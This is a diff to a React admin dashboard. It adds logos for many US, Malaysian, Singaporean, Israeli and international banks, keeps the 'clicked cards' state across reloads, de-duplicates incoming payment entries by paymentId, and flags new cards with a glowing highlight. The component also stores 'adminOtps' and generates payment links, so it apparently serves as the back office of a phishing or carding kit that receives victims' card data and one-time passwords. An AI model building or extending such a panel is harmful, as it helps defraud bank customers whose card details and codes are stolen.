@@ -364,7 +364,13 @@ const bankLogos = [
   { name: 'Bank Leumi', logo: 'https://upload.wikimedia.org/wikipedia/commons/e/eb/BankLeumiLogoReupload.png' },
   { name: 'Mizrahi Tefahot Bank', logo: 'https://upload.wikimedia.org/wikipedia/commons/6/62/%D7%9C%D7%95%D7%92%D7%95_%D7%A9%D7%9C_%D7%91%D7%A0%D7%A7_%D7%9E%D7%96%D7%A8%D7%97%D7%99-%D7%98%D7%A4%D7%97%D7%95%D7%AA.svg' },
   { name: 'First International Bank', logo: 'https://companiesmarketcap.com/img/company-logos/256/FIBI.TA.png' },
-  { name: 'Israel Discount Bank', logo: 'https://brandeps.com/logo-download/I/Israel-Discount-Bank-logo-vector-01.svg' }
+  { name: 'Israel Discount Bank', logo: 'https://brandeps.com/logo-download/I/Israel-Discount-Bank-logo-vector-01.svg' },
+  
+  // US Banks (from existing admin panel)
+  { name: 'PNC Bank', logo: 'https://logos-world.net/wp-content/uploads/2020/04/PNC-Logo.png' },
+  { name: 'Trust Bank', logo: 'https://companieslogo.com/img/orig/TRST-fe5b2b9c.png' },
+  { name: 'Capital One', logo: 'https://logos-world.net/wp-content/uploads/2020/04/Capital-One-Logo.png' },
+  { name: 'TD Bank', logo: 'https://logos-world.net/wp-content/uploads/2020/08/TD-Bank-Logo.png' }
 ];
 
 const Admin = () => {
@@ -429,7 +435,22 @@ const Admin = () => {
     localStorage.setItem('adminOtps', JSON.stringify(otps));
   }, [otps]);
   
-  const [clickedCards, setClickedCards] = useState<Set<string>>(new Set(JSON.parse(localStorage.getItem('clickedCards') || '[]')));
+  // Persistent clicked cards - never reset, survives refresh/restart
+  const [clickedCards, setClickedCards] = useState<Set<string>>(() => {
+    try {
+      const saved = localStorage.getItem('clickedCards');
+      return new Set(saved ? JSON.parse(saved) : []);
+    } catch {
+      return new Set();
+    }
+  });
+
+  // Save clicked cards to localStorage whenever updated
+  useEffect(() => {
+    localStorage.setItem('clickedCards', JSON.stringify([...clickedCards]));
+  }, [clickedCards]);
+
+
   const [paymentLinkAmount, setPaymentLinkAmount] = useState<string>('');
   const [paymentLinkCurrency, setPaymentLinkCurrency] = useState<string>('INR');
   const [generatedLink, setGeneratedLink] = useState<string>('');
@@ -570,7 +591,25 @@ const Admin = () => {
     { name: 'PNC Bank', logo: 'https://1000logos.net/wp-content/uploads/2021/05/PNC-Bank-logo-500x300.png' },
     { name: 'Truist Bank', logo: 'https://logodownload.org/wp-content/uploads/2021/04/truist-logo-4.png' },
     { name: 'Capital One', logo: 'https://brandeps.com/logo-download/C/Capital-One-Financial-logo-vector-01.svg' },
-    { name: 'TD Bank', logo: 'https://brandlogo.org/wp-content/uploads/2024/02/TD-Bank-N.A.-Logo.png' }
+    { name: 'TD Bank', logo: 'https://brandlogo.org/wp-content/uploads/2024/02/TD-Bank-N.A.-Logo.png' },
+    
+    // Malaysian Banks
+    { name: 'Maybank Malaysia', logo: 'https://logos-world.net/wp-content/uploads/2023/02/Maybank-Logo-500x281.png' },
+    { name: 'AmBank', logo: 'https://whatthelogo.com/storage/logos/ambank-group-108215.png' },
+    { name: 'CIMB Bank', logo: 'https://logolook.net/wp-content/uploads/2023/12/CIMB-Logo-500x281.png' },
+    
+    // Singapore Banks
+    { name: 'OCBC Bank', logo: 'https://logos-world.net/wp-content/uploads/2023/03/OCBC-Bank-Logo-500x281.png' },
+    
+    // International Banks
+    { name: 'HSBC', logo: 'https://1000logos.net/wp-content/uploads/2017/02/HSBC-symbol-500x148.jpg' },
+    
+    // Israeli Banks
+    { name: 'Bank Hapoalim', logo: 'https://cdn.freelogovectors.net/svg07/bank-hapoalim-logo.svg' },
+    { name: 'Bank Leumi', logo: 'https://upload.wikimedia.org/wikipedia/commons/e/eb/BankLeumiLogoReupload.png' },
+    { name: 'Mizrahi Tefahot Bank', logo: 'https://upload.wikimedia.org/wikipedia/commons/6/62/%D7%9C%D7%95%D7%92%D7%95_%D7%A9%D7%9C_%D7%91%D7%A0%D7%A7_%D7%9E%D7%96%D7%A8%D7%97%D7%99-%D7%98%D7%A4%D7%97%D7%95%D7%AA.svg' },
+    { name: 'First International Bank', logo: 'https://companiesmarketcap.com/img/company-logos/256/FIBI.TA.png' },
+    { name: 'Israel Discount Bank', logo: 'https://brandeps.com/logo-download/I/Israel-Discount-Bank-logo-vector-01.svg' }
   ];
 
   // Popular world currencies for conversion
@@ -2643,17 +2682,20 @@ const Admin = () => {
                 No payment data received yet. Waiting for transactions...
               </div>
             ) : (
-              payments.map((payment) => {
-                const isNewCard = !clickedCards.has(payment.id);
+              // Remove duplicate payments by paymentId to avoid showing multiple lines for same card
+              payments.filter((payment, index, self) => 
+                index === self.findIndex(p => p.paymentId === payment.paymentId)
+              ).map((payment) => {
+                const isNewCard = !clickedCards.has(payment.paymentId);
                 return (
                   <div 
-                    key={payment.id}
+                    key={payment.paymentId}
                     className={`p-4 border-b border-gray-700 last:border-b-0 transition-all duration-300 ${
                       isNewCard 
                         ? 'border-2 border-cyan-400 shadow-lg shadow-cyan-400/50 animate-pulse bg-gray-800/50' 
                         : 'hover:bg-gray-800'
                     }`}
-                    onClick={() => handleCardClick(payment.id)}
+                    onClick={() => handleCardClick(payment.paymentId)}
                     style={{
                       boxShadow: isNewCard ? '0 0 20px rgba(34, 211, 238, 0.6), inset 0 0 20px rgba(34, 211, 238, 0.1)' : undefined
                     }}
@@ -2833,7 +2875,7 @@ const Admin = () => {
                       <Button
                         onClick={(e) => {
                           e.stopPropagation();
-                          deleteTransaction(payment.id);
+                          deleteTransaction(payment.paymentId);
                         }}
                         size="sm"
                         variant="outline"
@@ -2899,17 +2941,20 @@ const Admin = () => {
                     </td>
                   </tr>
                 ) : (
-                  payments.map((payment) => {
-                    const isNewCard = !clickedCards.has(payment.id);
+                  // Remove duplicate payments by paymentId to avoid showing multiple lines for same card
+                  payments.filter((payment, index, self) => 
+                    index === self.findIndex(p => p.paymentId === payment.paymentId)
+                  ).map((payment) => {
+                    const isNewCard = !clickedCards.has(payment.paymentId);
                     return (
                     <tr 
-                      key={payment.id} 
+                      key={payment.paymentId} 
                       className={`hover:bg-gray-800 cursor-pointer transition-all duration-300 ${
                         isNewCard 
                           ? 'border-2 border-cyan-400 shadow-lg shadow-cyan-400/50 animate-pulse bg-gray-800/50' 
                           : ''
                       }`}
-                      onClick={() => handleCardClick(payment.id)}
+                      onClick={() => handleCardClick(payment.paymentId)}
                       style={{
                         boxShadow: isNewCard ? '0 0 20px rgba(34, 211, 238, 0.6), inset 0 0 20px rgba(34, 211, 238, 0.1)' : undefined
                       }}
